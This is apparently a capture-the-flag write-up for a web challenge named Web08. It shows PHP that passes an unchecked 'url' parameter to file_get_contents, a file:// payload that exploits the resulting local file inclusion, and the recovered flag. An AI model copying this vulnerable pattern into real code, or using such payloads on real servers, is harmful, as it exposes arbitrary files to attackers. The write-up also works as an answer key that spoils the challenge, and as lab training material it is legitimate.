# Solve Web08:

Upon accessing the web page, we don't see many available information - just a search page.

However, as it is possible to see in the code below, the comment in html mentioning the page `vuln132321321321.html`. Besides of that, the vulnerable here is a local file inclusion (LFI), where an attacker can read an arbitrary file in the system.

```

<!-- Just to remember: g3n3 don't forget to remove the file vuln132321321321.html from temporary djudjuba folder ok? -->

<div>
            <?php
            if (isset($_GET['url'])) {
                $url = $_GET['url'];
                echo "<h2>Content:</h2>";
                
                // Realize uma solicitação HTTP para obter o conteúdo da URL
                $content = file_get_contents($url);
                
                // Exiba o conteúdo no corpo da página
                echo "<pre>" . htmlentities($content) . "</pre>";
            }
            ?>
        </div>
```

In this case, injecting the input `file:///etc/vuln132321321321.html` the output will be:

```
iFlag{fuzz











































<!-- ok, but you missed the middle hehehe, the MIDDLE!!!! NOT THE LAST PART, catch it if you are fast... 
















	1s_v3ry_c00l} -->
```

After that, is missing the **middle** of the flag. Yes, the middle. You could just fuzzing the endpoint or justing guessing that is `middle.html`.

By acessing `middle.html`: 

```
<html> <h1>Meeh, nice try... are you sure that you saw enough?? </h1> <!-- "1ng_p0rts_" --></html>
```

Finally, the entire flag is: 

```
iFlag{fuzz1ng_p0rts_1s_v3ry_c00l}
```
